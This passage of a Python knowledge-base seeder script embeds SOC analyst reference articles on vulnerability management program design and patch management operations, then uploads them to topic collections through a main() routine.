- [ ] Prioritize containment actions based on function criticality
- [ ] Consider dependency chains when assessing incident scope
- [ ] Communicate impact in business terms using BIA data

## Key Takeaways

- The BIA is the foundation of all business continuity planning
- Financial impact data drives RTO/RPO decisions and DR investment
- Interview process owners, not just IT; they understand business impact
- Dependency mapping reveals hidden single points of failure
- BIA must be updated annually or when significant changes occur
- SOC analysts should use BIA data to prioritize monitoring and response
- Impact over time analysis is the most valuable BIA output
"""
    ))

    # ------------------------------------------------------------------
    # Article 15: Vulnerability Management Program Design
    # ------------------------------------------------------------------
    articles.append((
        "Vulnerability Management Program Design",
        ["governance", "risk", "vulnerability-management", "cvss", "scanning", "remediation"],
        r"""# Vulnerability Management Program Design

## Overview

Vulnerability management is the continuous process of identifying, classifying, prioritizing,
remediating, and mitigating security vulnerabilities. A mature program goes beyond scanning
and patching to become a risk-based, metrics-driven discipline. SOC analysts interact with
vulnerability data daily through alert correlation, threat intelligence, and incident
investigation.

## Program Maturity Levels

| Level | Name | Characteristics | Typical Tools |
|-------|------|----------------|---------------|
| 1 | Ad Hoc | Occasional scans, no process | Free scanner, spreadsheets |
| 2 | Defined | Regular scans, basic tracking | Commercial scanner, ticketing |
| 3 | Managed | Risk-based prioritization, SLAs | Scanner + risk platform, CMDB |
| 4 | Measured | Metrics-driven, integrated workflows | Integrated VM platform, automation |
| 5 | Optimized | Predictive, continuous, automated | Full stack integration, ML-assisted |

### Maturity Assessment

| Capability | Level 1 | Level 3 | Level 5 |
|-----------|---------|---------|---------|
| Asset inventory | Partial, manual | Complete, semi-automated | Real-time, automated discovery |
| Scanning frequency | Quarterly or less | Monthly | Continuous |
| Prioritization | CVSS score only | CVSS + asset criticality | CVSS + threat intel + exploitability + business context |
| Remediation tracking | None or ad hoc | Ticketing with SLAs | Automated workflow with escalation |
| Metrics | None | Basic (count, age) | Comprehensive (risk reduction, SLA compliance) |
| Integration | Standalone | Connected to ticketing | Full stack (SIEM, SOAR, CMDB, patching) |

## Asset Inventory

### Why Asset Inventory Comes First

You cannot protect what you do not know about. Asset inventory is the foundation.

| Asset Category | Discovery Method | Update Frequency |
|---------------|-----------------|-----------------|
| Servers (on-premise) | Network scanning, CMDB | Weekly |
| Endpoints | EDR agent inventory, AD/SCCM | Daily |
| Cloud resources | Cloud API integration (AWS, Azure, GCP) | Real-time |
| Network devices | SNMP, network management tools | Weekly |
| Applications | Application portfolio, SBOM | Monthly |
| Containers | Container registry, orchestrator API | Real-time |
| IoT/OT devices | Passive network monitoring | Weekly |
| Shadow IT | Network anomaly detection, CASB | Continuous |

### Asset Criticality Classification

| Tier | Criteria | Examples | Vulnerability SLA |
|------|---------|---------|-------------------|
| Tier 1 | Internet-facing, handles restricted data, mission-critical | Payment servers, customer DB | Critical: 24 hrs, High: 72 hrs |
| Tier 2 | Internal, handles confidential data, business-critical | ERP, email servers, AD controllers | Critical: 72 hrs, High: 7 days |
| Tier 3 | Internal, handles internal data, business-important | File servers, development systems | Critical: 7 days, High: 14 days |
| Tier 4 | Low-risk, handles public data, non-critical | Printers, digital signage, test systems | Critical: 14 days, High: 30 days |

## Scanning Strategy

### Scan Types

| Scan Type | Purpose | Frequency | Impact |
|-----------|---------|-----------|--------|
| Network vulnerability scan | Find network-accessible vulnerabilities | Weekly-Monthly | Low (non-intrusive) |
| Authenticated scan | Deep OS and application assessment | Monthly | Low-Medium |
| Web application scan | OWASP Top 10 and web-specific vulns | Monthly-Quarterly | Medium |
| Container image scan | Vulnerabilities in container images | Every build | None (pre-deployment) |
| Code scan (SAST) | Vulnerabilities in source code | Every commit | None (pre-deployment) |
| Cloud configuration scan | Misconfigurations in cloud resources | Daily-Weekly | None |
| Compliance scan | CIS benchmark and policy compliance | Monthly | Low |

### Scanning Schedule

| Asset Category | Scan Type | Frequency | Window |
|---------------|-----------|-----------|--------|
| Internet-facing servers | Network + Authenticated | Weekly | Saturday 02:00-06:00 |
| Internal servers | Authenticated | Bi-weekly | Sunday 02:00-06:00 |
| Endpoints | Agent-based continuous | Continuous | N/A (lightweight) |
| Web applications | DAST | Monthly | Weekend maintenance window |
| Cloud infrastructure | API-based configuration | Daily | N/A (non-intrusive) |
| Container images | Registry scan | Every push | CI/CD pipeline |

## Prioritization: CVSS Plus Context

### Why CVSS Alone Is Not Enough

| CVSS Score | Without Context | With Context |
|-----------|----------------|-------------|
| 9.8 Critical | Patch immediately | Internal-only system, no sensitive data, compensating firewall rule: Medium priority |
| 7.5 High | Patch within 30 days | Internet-facing, actively exploited, handles PCI data: Patch within 24 hours |
| 4.3 Medium | Patch within 90 days | On critical domain controller, part of attack chain: Patch within 7 days |

### Risk-Based Prioritization Formula

```
Effective Priority = CVSS Base Score
                   + Asset Criticality Modifier (+/- 2)
                   + Exploit Availability Modifier (+0 to +2)
                   + Threat Intelligence Modifier (+0 to +2)
                   + Compensating Control Modifier (-1 to -3)
                   + Network Exposure Modifier (+0 to +2)
```

### Prioritization Decision Matrix

| Factor | Weight | Source |
|--------|--------|--------|
| CVSS Base Score | Baseline | Vulnerability scanner |
| Asset criticality | High | CMDB / asset inventory |
| Known exploit available | High | Exploit databases (ExploitDB, Metasploit) |
| Active exploitation in the wild | Critical | CISA KEV catalog, threat intelligence |
| Internet-facing | High | Network architecture |
| Compensating controls | Medium (reduces priority) | Security tool configuration |
| Data sensitivity | High | Data classification |
| Regulatory requirement | High | Compliance requirements |

### CISA Known Exploited Vulnerabilities (KEV)

The CISA KEV catalog lists vulnerabilities known to be actively exploited. These should
be prioritized above all others regardless of CVSS score.

| KEV Action | Requirement |
|-----------|-------------|
| Federal agencies | Must remediate by the due date listed in KEV |
| Private sector | Strongly recommended to treat KEV entries as highest priority |
| SOC relevance | KEV entries should trigger detection rule reviews |

## SLA Definitions

### Remediation SLAs by Effective Priority

| Effective Priority | Remediation SLA | Reporting Frequency |
|-------------------|----------------|-------------------|
| Critical (actively exploited, internet-facing) | 24-48 hours | Immediate notification to CISO |
| Critical (other) | 7 days | Weekly report |
| High | 14-30 days | Weekly report |
| Medium | 30-60 days | Monthly report |
| Low | 60-90 days | Quarterly report |
| Informational | Next scheduled maintenance | No reporting |

### SLA Escalation Matrix

| SLA Breach | Escalation |
|-----------|-----------|
| 50% of SLA elapsed, no action | Notify system owner and their manager |
| SLA deadline reached | Escalate to IT Director and CISO |
| 2x SLA exceeded | Escalate to CTO/CIO |
| 3x SLA exceeded | Report to executive leadership and risk committee |

## Exception Process

### When Remediation Cannot Meet SLA

| Step | Action | Owner |
|------|--------|-------|
| 1 | Document business justification for exception | System owner |
| 2 | Identify compensating controls | Security team |
| 3 | Perform risk assessment of exception | Risk management |
| 4 | Approve or reject exception | CISO or risk committee |
| 5 | Implement compensating controls | IT / Security |
| 6 | Set exception expiration date | Risk management |
| 7 | Monitor and reassess at expiration | Security team |

### Exception Documentation

| Field | Content |
|-------|---------|
| Vulnerability | CVE-2026-XXXX, CVSS 9.1 Critical |
| Affected asset | SRV-LEGACY-01, Tier 2 |
| Reason for exception | Legacy application requires OS version with this vulnerability |
| Compensating controls | Network isolation, enhanced monitoring, WAF rule |
| Risk assessment | Residual risk: Medium (reduced from Critical by compensating controls) |
| Exception owner | Jane Smith, Application Owner |
| Approved by | CISO, 2026-02-15 |
| Expiration date | 2026-05-15 (90 days) |
| Reassessment plan | Application migration scheduled for Q2 2026 |

## Program Metrics

| Metric | Calculation | Target | Trend |
|--------|-----------|--------|-------|
| Mean time to remediate (MTTR) | Average days from discovery to fix | Critical: < 7 days | Decreasing |
| Vulnerability age | Average age of open vulnerabilities | < 30 days | Decreasing |
| SLA compliance rate | Vulns remediated within SLA / Total | > 90% | Increasing |
| Scan coverage | Assets scanned / Total assets | > 95% | Approaching 100% |
| Recurrence rate | Vulns that reappear after remediation | < 5% | Decreasing |
| Exception count | Active exceptions | Trending down | Decreasing |
| Risk reduction | ALE reduction from remediation | Positive trend | Increasing |
| Overdue critical vulns | Critical vulns past SLA | 0 (target) | Zero |

## Integration with Patching

### Vulnerability-to-Patch Workflow

```
Vulnerability discovered
  |-> Prioritized by risk-based model
  |-> Remediation ticket created (auto or manual)
  |-> Assigned to system owner
  |-> Remediation options:
  |    |-- Patch available --> Initiate patch management process
  |    |-- No patch available --> Implement compensating controls
  |    |-- Cannot remediate --> Exception process
  |-> Verification scan after remediation
  |-> Close ticket if verified fixed
  |-> Re-open if vulnerability persists
```

## SOC Integration Points

### How SOC Teams Use Vulnerability Data

- [ ] Correlate new vulnerability disclosures with asset inventory
- [ ] Prioritize monitoring for systems with unpatched critical vulnerabilities
- [ ] Create detection rules for known exploitation techniques
- [ ] Use vulnerability context during incident investigation
- [ ] Alert on scanning activity targeting known vulnerable systems
- [ ] Report on vulnerability exploitation attempts in SOC metrics
- [ ] Feed incident data back to improve vulnerability prioritization

## Key Takeaways

- Vulnerability management is a program, not a scan
- Asset inventory is the foundation; you cannot scan what you do not know
- CVSS is a starting point, not the final priority; add business context
- CISA KEV entries should be treated as highest priority regardless of CVSS
- SLAs with escalation create accountability for remediation
- Exception processes prevent shadow risk from undocumented acceptance
- Metrics drive improvement; measure what matters and report regularly
- SOC and vulnerability management teams should share data bidirectionally
"""
    ))

    # ------------------------------------------------------------------
    # Article 16: Patch Management Strategy and Operations
    # ------------------------------------------------------------------
    articles.append((
        "Patch Management Strategy and Operations",
        ["governance", "risk", "patch-management", "patching", "vulnerability-remediation"],
        r"""# Patch Management Strategy and Operations

## Overview

Patch management is the process of acquiring, testing, and deploying software updates to
fix vulnerabilities, correct bugs, and improve functionality. For SOC analysts, unpatched
systems are the most common attack surface. Understanding patch management helps you
assess risk, prioritize alerts, and communicate remediation urgency.

## Patch Sources

| Source | Types of Patches | Frequency | Examples |
|--------|-----------------|-----------|---------|
| **OS Vendors** | Operating system security patches | Monthly (Patch Tuesday) | Microsoft, Apple, Red Hat |
| **Application Vendors** | Application-specific fixes | Varies (monthly to ad hoc) | Adobe, Oracle, SAP |
| **Open Source Projects** | Community-maintained patches | Varies | Apache, OpenSSL, Linux kernel |
| **Firmware Vendors** | Hardware and firmware updates | Quarterly to annual | Cisco, Dell, HP |
| **Cloud Providers** | Managed service patches | Continuous (transparent) | AWS, Azure, GCP managed services |
| **Third-Party Aggregators** | Bundled and tested patches | Monthly | WSUS, SCCM, Jamf |

### Patch Tuesday and Beyond

| Vendor | Patch Schedule | Notes |
|--------|---------------|-------|
| Microsoft | 2nd Tuesday monthly | "Patch Tuesday" - largest single patch event |
| Adobe | 2nd Tuesday monthly | Aligns with Microsoft Patch Tuesday |
| Oracle | Quarterly (Jan, Apr, Jul, Oct) | Critical Patch Update (CPU) |
| Apple | Ad hoc (roughly monthly) | No fixed schedule |
| Cisco | Variable | Semi-annual for IOS, ad hoc for critical |
| Linux distros | Continuous + point releases | Security updates available immediately |
| Google Chrome | Every 2-4 weeks | Auto-update by default |
| Mozilla Firefox | Every 4 weeks | Regular release cycle |

## Testing Methodology

### Pre-Deployment Testing Process

```
Patch released by vendor
  |-> Security team reviews patch details and severity
  |-> Relevance assessment: Does this apply to our environment?
  |     |-- No --> Document and close
  |     |-- Yes --> Continue
  |-> Download patch from verified source
  |-> Deploy to test environment
  |     |-- Functional testing: Does the system still work?
  |     |-- Compatibility testing: Do dependent applications work?
  |     |-- Performance testing: Any degradation?
  |     |-- Security testing: Does the patch fix the vulnerability?
  |-> Test results:
  |     |-- Pass --> Approve for production deployment
  |     |-- Fail --> Report to vendor, find workaround
  |-> Schedule production deployment per ring/phase
```

### Test Environment Requirements

| Requirement | Purpose |
|-------------|---------|
| Representative hardware | Catch hardware-specific issues |
| Same OS versions as production | Catch version-specific issues |
| Key applications installed | Catch application compatibility issues |
| Realistic configurations | Catch configuration-specific issues |
| Monitoring active | Detect performance impacts |
| Rollback capability | Quickly revert if testing fails |

## Deployment Strategies

### Ring-Based Deployment

| Ring | Scope | Timeline | Purpose |
|------|-------|----------|---------|
| Ring 0 | IT/Security team devices | Day 1 | Earliest real-world testing |
| Ring 1 | Pilot group (5-10% of users) | Day 2-3 | Broader compatibility testing |
| Ring 2 | General population (50%) | Day 4-7 | Gradual rollout |
| Ring 3 | Remaining systems (100%) | Day 7-14 | Full deployment |
| Ring 4 | Critical/sensitive systems | Day 14-21 | Last, after stability confirmed |

### Phased Deployment by Environment

| Phase | Environment | Approval | Rollback Window |
|-------|------------|----------|----------------|
| 1 | Development | Automated | N/A |
| 2 | Staging/QA | Team lead | 24 hours |
| 3 | Production (non-critical) | Change manager | 48 hours |
| 4 | Production (critical) | CAB approval | 72 hours |
| 5 | Production (regulated) | CAB + compliance | 72 hours |

### Deployment Windows

| System Type | Preferred Window | Blackout Periods |
|-------------|-----------------|-----------------|
| Workstations | Overnight or during lunch | None typically |
| Non-critical servers | Weekend maintenance window | Month-end, quarter-end |
| Critical servers | Scheduled maintenance window | Business peak hours |
| Network devices | Late night / early morning | Business hours |
| Database servers | Extended maintenance window | Reporting periods |
| Production web servers | Blue/green deployment (no window needed) | None with proper architecture |

## Emergency Patching

### When to Invoke Emergency Patching

| Criteria | Action |
|----------|--------|
| CISA KEV listing with short deadline | Emergency patch within 48 hours |
| Active exploitation in the wild targeting your industry | Emergency patch within 48-72 hours |
| Critical CVSS (9.0+) with public exploit AND internet-facing | Emergency patch within 72 hours |
| Wormable vulnerability (self-propagating) | Emergency patch within 24-48 hours |
| Vendor recommends immediate patching | Emergency patch per vendor guidance |

### Emergency Patch Process

```
Emergency patch trigger identified
  |-> Security team validates urgency
  |-> Notify CISO and IT leadership
  |-> Bypass normal CAB process (emergency change)
  |-> Abbreviated testing:
  |     - Core functionality check only
  |     - 1-2 hours maximum testing time
  |-> Deploy to highest-risk systems first
  |     - Internet-facing systems
  |     - Systems handling sensitive data
  |     - Systems with known exposure
  |-> Monitor for issues post-deployment
  |-> Complete normal testing for remaining systems
  |-> Document emergency change retroactively
  |-> Post-implementation review within 48 hours
```

## Tracking Compliance

### Patch Compliance Dashboard Metrics

| Metric | Definition | Target |
|--------|-----------|--------|
| Compliance rate | Systems patched within SLA / Total systems | > 95% |
| Coverage rate | Systems with patch agent / Total systems | > 98% |
| Critical patch SLA | Time from release to deployment (critical patches) | < 72 hours |
| High patch SLA | Time from release to deployment (high patches) | < 14 days |
| Overdue patches | Systems with patches past SLA deadline | < 2% |
| Patch failure rate | Patches that failed to install / Total patches | < 3% |
| Reboot pending | Systems patched but pending reboot | < 5% |

### Compliance Reporting

| Audience | Frequency | Content |
|----------|-----------|---------|
| IT Operations | Weekly | Detailed patch status by system, failures, pending |
| SOC Team | Weekly | Unpatched critical vulns, exposure assessment |
| Security Leadership | Monthly | Compliance rates, trends, risk reduction |
| Executive Team | Quarterly | Compliance summary, risk metrics, exceptions |
| Auditors | On request | Full compliance evidence, SLA adherence |

## Common Challenges

| Challenge | Impact | Mitigation |
|-----------|--------|-----------|
| Legacy systems that cannot be patched | Persistent vulnerability exposure | Virtual patching (WAF/IPS), isolation, compensating controls |
| Patch breaks application | Availability impact | Better testing, staged deployment, rapid rollback |
| Systems not managed by IT | Unknown patch status | Discovery scanning, BYOD policy enforcement |
| Patch fatigue (too many patches) | Slow deployment, analyst burnout | Risk-based prioritization, automation |
| Reboot requirements | Business disruption | Schedule during maintenance, use live patching where possible |
| Third-party application patches | Inconsistent delivery | Third-party patch management tools, centralized tracking |
| Patch deployment failures | Systems remain vulnerable | Automated retry, failure alerting, manual intervention process |
| Remote/mobile devices | Inconsistent connectivity | Cloud-based patch management, VPN requirements |

### Legacy System Strategies

| Strategy | Description | When to Use |
|----------|------------|-------------|
| Virtual patching | IPS/WAF rules to block exploit | No vendor patch available |
| Network isolation | Restrict network access to minimum | System cannot be patched at all |
| Application whitelisting | Only approved executables can run | Limit exploit delivery vectors |
| Enhanced monitoring | Extra logging and alerting | Accept risk with increased visibility |
| Migration planning | Plan to replace legacy system | Long-term solution |
| Compensating controls | Multiple layers of defense | When patching is not feasible |

## Automation Tools Overview

### Patch Management Tool Categories

| Category | Purpose | Examples |
|----------|---------|---------|
| **OS Patching** | Operating system updates | WSUS, SCCM/MECM, RHEL Satellite, Jamf |
| **Third-Party Patching** | Non-OS application updates | Ivanti, ManageEngine, PDQ Deploy |
| **Cloud Patching** | Cloud instance management | AWS Systems Manager, Azure Update Management |
| **Container Patching** | Container image updates | Renovate, Dependabot, Snyk |
| **Configuration Management** | Desired state enforcement | Ansible, Puppet, Chef, SaltStack |
| **Vulnerability Scanners** | Identify missing patches | Tenable, Qualys, Rapid7 |
| **Orchestration/SOAR** | Automate patch workflows | XSOAR, Splunk SOAR, Swimlane |

### Automation Maturity

| Level | Automation Scope | Human Involvement |
|-------|-----------------|-------------------|
| Manual | Download and deploy manually | Full manual process |
| Semi-automated | Automated scan, manual deploy | Approve and schedule |
| Automated with approval | Auto-scan, auto-test, human approval | Approve only |
| Fully automated (standard) | End-to-end for low-risk patches | Monitor only |
| Intelligent automation | Risk-based auto-prioritization and deployment | Exception handling only |

## SOC Analyst Integration

### How Patching Affects SOC Operations

| Patch Status | SOC Impact | Action |
|-------------|-----------|--------|
| Critical patch pending | Systems vulnerable to known exploits | Increase monitoring, create targeted detections |
| Emergency patch deploying | Potential for false positives during patching | Expect system restarts, config changes |
| Patch failed on critical system | Extended vulnerability window | Alert system owner, increase monitoring |
| Patch window active | Expected maintenance activity | Suppress known maintenance alerts |
| Unpatched legacy system | Persistent risk accepted | Enhanced monitoring rules, document in risk register |

### SOC Patch-Related Detections

| Detection | Purpose |
|-----------|---------|
| Exploit attempt against known unpatched vulnerability | Active attack on vulnerable system |
| Unauthorized patching activity | Patch deployed outside approved window |
| Patch agent failure | System lost patch management connectivity |
| New system without patch agent | Shadow IT or provisioning gap |
| Reboot overdue after critical patch | Patch installed but not fully applied |

### Patch Tuesday Workflow for SOC

```
Patch Tuesday (2nd Tuesday of month):
  Day 0: Vendor releases patches
    |-> Review advisories for critical and exploited vulnerabilities
    |-> Cross-reference with asset inventory
    |-> Identify systems at highest risk

  Day 1-3: Testing phase
    |-> Create or update detection rules for newly disclosed vulns
    |-> Monitor for exploitation attempts
    |-> Alert on scanning activity targeting new CVEs

  Day 3-14: Deployment phase
    |-> Monitor patch deployment progress
    |-> Increase monitoring for unpatched systems
    |-> Track patch failures for risk assessment

  Day 14+: Verification phase
    |-> Verify critical systems are patched
    |-> Report on remaining unpatched systems
    |-> Maintain heightened monitoring until coverage > 95%
```

## Key Takeaways

- Patch management is a risk reduction activity, not just an IT task
- Ring-based deployment balances speed with safety
- Emergency patching requires a pre-defined, practiced process
- Legacy systems need compensating controls when patches are unavailable
- Automation is essential for scale; manual patching does not scale
- SOC teams should increase monitoring for unpatched systems
- Track compliance metrics and report to leadership regularly
- Patch Tuesday is a monthly cycle that affects the entire security posture
"""
    ))

    return articles




# ============================================================
# COLLECTIONS CONFIGURATION
# ============================================================

COLLECTIONS = [
    (
        "Network Fundamentals",
        "OSI model, TCP/IP, DNS, DHCP, subnetting, VLANs, routing, switching, wireless, packet analysis",
        network_fundamentals_articles,
    ),
    (
        "Network Infrastructure & Devices",
        "Firewalls, IDS/IPS, proxies, VPNs, switches, routers, WAFs, SIEM architecture, cloud networking",
        network_infrastructure_articles,
    ),
    (
        "Cryptography & PKI",
        "Symmetric and asymmetric encryption, hashing, digital signatures, TLS, certificates, Kerberos, OAuth, SAML",
        cryptography_pki_articles,
    ),
    (
        "Identity & Access Management",
        "Authentication, authorization models, Active Directory, LDAP, SSO, PAM, MFA, Zero Trust, cloud IAM",
        identity_access_articles,
    ),
    (
        "Threats, Attacks & Vulnerabilities",
        "Malware, social engineering, network attacks, web app attacks, password attacks, DDoS, APTs, vulnerability management",
        threats_attacks_articles,
    ),
    (
        "Governance, Risk & Compliance",
        "Risk management, security frameworks, BCP/DR, incident response lifecycle, policies, privacy regulations, auditing",
        governance_risk_compliance_articles,
    ),
]


def main():
    print("=" * 60)
    print("IXION Foundational Security Knowledge Base Seeder")
    print("=" * 60)

    login()

    parent_id = get_or_create_collection(
        "Knowledge Base",
        "SOC Analyst Reference Library",
    )

    total = 0
    for col_name, col_desc, article_fn in COLLECTIONS:
        print(f"\n{'=' * 50}")
        print(f"Collection: {col_name}")
        print(f"{'=' * 50}")
        col_id = get_or_create_collection(col_name, col_desc, parent_id)
        articles = article_fn()
        for title, tags, content in articles:
            upload_article(title, content, tags, col_id)
            total += 1
            time.sleep(0.05)

    print(f"\n{'=' * 60}")
    print(f"Done! Uploaded {total} articles to Knowledge Base.")
    print(f"{'=' * 60}")


if __name__ == "__main__":
    main()


